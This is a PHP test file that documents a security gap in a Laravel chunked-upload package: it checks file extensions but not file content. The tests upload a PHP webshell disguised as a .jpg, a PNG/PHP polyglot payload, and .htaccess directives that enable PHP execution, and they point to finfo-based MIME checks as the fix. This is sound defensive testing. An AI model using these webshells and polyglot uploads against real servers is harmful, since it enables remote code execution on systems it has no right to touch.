<?php

declare(strict_types=1);

namespace Juanoecr\StatefulChunkingUpload\Tests\Feature\Security;

use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Config;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Facades\Storage;
use Juanoecr\StatefulChunkingUpload\Tests\TestCase;

/**
 * OFFENSIVE SECURITY TESTS: MIME Type vs File Extension Gap
 *
 * Security Finding: The package validates file NAMES (extension blacklist) but does NOT
 * validate file CONTENT (MIME type detection via finfo/mime_content_type).
 *
 * This means an attacker can upload executable PHP code with a .jpg extension and the
 * package will ACCEPT it, storing the file on disk with the benign-looking extension.
 *
 * Attack surface: If the storage disk is web-accessible (e.g., storage/public) and
 * the web server is misconfigured to execute .jpg files via PHP-FPM (unlikely but possible
 * via .htaccess overrides or misconfigured server blocks), the stored file could be executed.
 *
 * NOTE: These tests CONFIRM the gap exists. The fix would require MIME detection via
 * PHP's finfo extension or the mime-type validator in Laravel.
 */
class AdvSec_MimeTypeExtensionGapTest extends TestCase
{
    protected function setUp(): void
    {
        parent::setUp();
        Storage::fake('local');
        Config::set('stateful-chunking-upload.rate_limits.initiate', 1000);
        Config::set('stateful-chunking-upload.rate_limits.upload', 1000);
        RateLimiter::clear('stateful-chunking-upload.initiate');
        RateLimiter::clear('stateful-chunking-upload.upload');
    }

    // -------------------------------------------------------------------------
    // Attack 1: PHP webshell disguised as a .jpg image
    // -------------------------------------------------------------------------

    /**
     * ATTACK: Upload a PHP webshell with a .jpg extension.
     * EXPECTED: The package ACCEPTS the file (only checks extension, not content).
     * VULN: An attacker on a misconfigured server could execute this file via HTTP.
     */
    public function test_mime_gap_php_webshell_with_jpg_extension_is_accepted(): void
    {
        $phpWebshellContent = '<?php system($_GET["cmd"]); ?>';
        $contentHash = hash('sha256', $phpWebshellContent);

        // Initiate session with a .jpg filename (passes extension blacklist)
        $initiateResponse = $this->postJson('/api/chunks/initiate', [
            'file_name' => 'profile_photo.jpg',
            'file_size' => strlen($phpWebshellContent),
            'total_chunks' => 1,
            'total_hash' => $contentHash,
            'fingerprint' => 'mime_gap_webshell_'.uniqid(),
        ]);

        $initiateResponse->assertStatus(201, 'Session with .jpg filename must be accepted');
        $sessionId = (string) $initiateResponse->json('data.session_id');

        // Upload the PHP content disguised as a JPEG chunk
        $maliciousFile = UploadedFile::fake()->createWithContent('profile_photo.jpg', $phpWebshellContent);

        $uploadResponse = $this->call('POST', '/api/chunks/upload', [
            'session_id' => $sessionId,
            'chunk_index' => 0,
            'chunk_hash' => $contentHash,
        ], [], ['file' => $maliciousFile], ['HTTP_ACCEPT' => 'application/json']);

        // MIME GAP CONFIRMED: PHP content with .jpg extension is ACCEPTED
        $this->assertEquals(
            200,
            $uploadResponse->status(),
            'MIME TYPE GAP CONFIRMED: PHP webshell uploaded with .jpg extension was accepted. '
            .'The package only validates the file extension, not the actual MIME content. '
            .'Fix: use finfo_file() or Laravel mime validator to check actual content type.'
        );

        // Verify the file actually exists on disk with PHP content
        $chunksMap = $uploadResponse->json('data.chunks_map');
        $this->assertEquals('completed', $chunksMap[0] ?? 'pending',
            'Chunk 0 was stored successfully with PHP webshell content');

        // Complete the upload - the PHP file gets assembled under a .jpg name
        $completeResponse = $this->postJson('/api/chunks/complete', [
            'session_id' => $sessionId,
        ]);

        $this->assertEquals(
            200,
            $completeResponse->status(),
            'The assembled PHP webshell with .jpg extension is fully stored on disk'
        );
    }

    // -------------------------------------------------------------------------
    // Attack 2: PHP payload in fake PNG (magic bytes spoofing)
    // -------------------------------------------------------------------------

    /**
     * ATTACK: Upload a file that starts with valid PNG magic bytes but contains
     * PHP execution code after the header. Known as "polyglot" file attack.
     *
     * Real PNG magic bytes: \x89PNG\r\n\x1a\n
     */
    public function test_mime_gap_polyglot_png_with_php_payload_is_accepted(): void
    {
        // Valid PNG magic bytes followed by PHP payload
        $pngMagic = "\x89PNG\r\n\x1a\n";
        $phpPayload = '<?php echo shell_exec($_POST["c"]); ?>';
        $polyglot = $pngMagic.str_repeat("\x00", 16).$phpPayload;
        $contentHash = hash('sha256', $polyglot);

        $initiateResponse = $this->postJson('/api/chunks/initiate', [
            'file_name' => 'avatar.png',
            'file_size' => strlen($polyglot),
            'total_chunks' => 1,
            'total_hash' => $contentHash,
            'fingerprint' => 'mime_gap_polyglot_'.uniqid(),
        ]);

        $initiateResponse->assertStatus(201);
        $sessionId = (string) $initiateResponse->json('data.session_id');

        $polyglotFile = UploadedFile::fake()->createWithContent('avatar.png', $polyglot);

        $uploadResponse = $this->call('POST', '/api/chunks/upload', [
            'session_id' => $sessionId,
            'chunk_index' => 0,
            'chunk_hash' => $contentHash,
        ], [], ['file' => $polyglotFile], ['HTTP_ACCEPT' => 'application/json']);

        // POLYGLOT ACCEPTED: content validation is absent
        $this->assertEquals(
            200,
            $uploadResponse->status(),
            'MIME TYPE GAP CONFIRMED: Polyglot PNG+PHP file was accepted. '
            .'finfo_file() would detect the embedded PHP code or suspicious content.'
        );
    }

    // -------------------------------------------------------------------------
    // Attack 3: .htaccess content disguised as .txt
    // -------------------------------------------------------------------------

    /**
     * ATTACK: Upload an .htaccess payload disguised as a .txt file.
     * If somehow the file ends up in a web-accessible directory and the
     * storage disk is not protected, this could change Apache behavior.
     */
    public function test_mime_gap_htaccess_payload_as_txt_is_accepted(): void
    {
        $htaccessContent = "AddType application/x-httpd-php .jpg\nOptions +ExecCGI\n";
        $contentHash = hash('sha256', $htaccessContent);

        $initiateResponse = $this->postJson('/api/chunks/initiate', [
            'file_name' => 'readme.txt',
            'file_size' => strlen($htaccessContent),
            'total_chunks' => 1,
            'total_hash' => $contentHash,
            'fingerprint' => 'mime_gap_htaccess_'.uniqid(),
        ]);

        $initiateResponse->assertStatus(201);
        $sessionId = (string) $initiateResponse->json('data.session_id');

        $htaccessFile = UploadedFile::fake()->createWithContent('readme.txt', $htaccessContent);

        $uploadResponse = $this->call('POST', '/api/chunks/upload', [
            'session_id' => $sessionId,
            'chunk_index' => 0,
            'chunk_hash' => $contentHash,
        ], [], ['file' => $htaccessFile], ['HTTP_ACCEPT' => 'application/json']);

        $this->assertEquals(
            200,
            $uploadResponse->status(),
            'MIME TYPE GAP: .htaccess content stored as readme.txt - no content inspection performed'
        );
    }

    // -------------------------------------------------------------------------
    // Control: .php extension is correctly blocked by extension blacklist
    // -------------------------------------------------------------------------

    /**
     * CONTROL: Confirm that a file with an explicit .php extension IS blocked.
     * The gap is ONLY in content validation, not extension validation.
     */
    public function test_mime_gap_control_explicit_php_extension_is_blocked(): void
    {
        $phpContent = '<?php phpinfo(); ?>';
        $contentHash = hash('sha256', $phpContent);

        $initiateResponse = $this->postJson('/api/chunks/initiate', [
            'file_name' => 'shell.php',
            'file_size' => strlen($phpContent),
            'total_chunks' => 1,
            'total_hash' => $contentHash,
            'fingerprint' => 'mime_control_php_'.uniqid(),
        ]);

        // Extension blacklist DOES block .php
        $initiateResponse->assertStatus(422, 'Explicit .php extension must be rejected by extension blacklist');
        $initiateResponse->assertJsonValidationErrors('file_name');
    }

    // -------------------------------------------------------------------------
    // Documents the fix required
    // -------------------------------------------------------------------------

    /**
     * Documents what a proper MIME type validation would look like.
     * This test is informational - it verifies PHP's finfo extension can
     * detect PHP content even when the extension says .jpg.
     */
    public function test_mime_gap_documents_finfo_can_detect_php_in_jpg(): void
    {
        if (! extension_loaded('fileinfo')) {
            $this->markTestSkipped('fileinfo extension not available');
        }

        $phpWebshellContent = '<?php system($_GET["cmd"]); ?>';

        // Write to a temp file with .jpg extension
        $tmpFile = tempnam(sys_get_temp_dir(), 'mime_test_').'.jpg';
        file_put_contents($tmpFile, $phpWebshellContent);

        try {
            $finfo = new \finfo(FILEINFO_MIME_TYPE);
            $mimeType = $finfo->file($tmpFile);

            // finfo detects the actual content type, not the extension
            $this->assertNotEquals(
                'image/jpeg',
                $mimeType,
                'finfo correctly identifies that the file is NOT a JPEG image'
            );

            // The actual MIME type detected for PHP code
            $this->assertStringContainsString(
                'text',
                (string) $mimeType,
                'finfo detects PHP code as text/* content, not image/jpeg'
            );

            fwrite(STDERR, "\n[MIME GAP] finfo detected '{$mimeType}' for PHP content with .jpg extension. "
                ."A MIME validator would block this. The package currently does NOT use finfo.\n");
        } finally {
            @unlink($tmpFile);
        }
    }
}
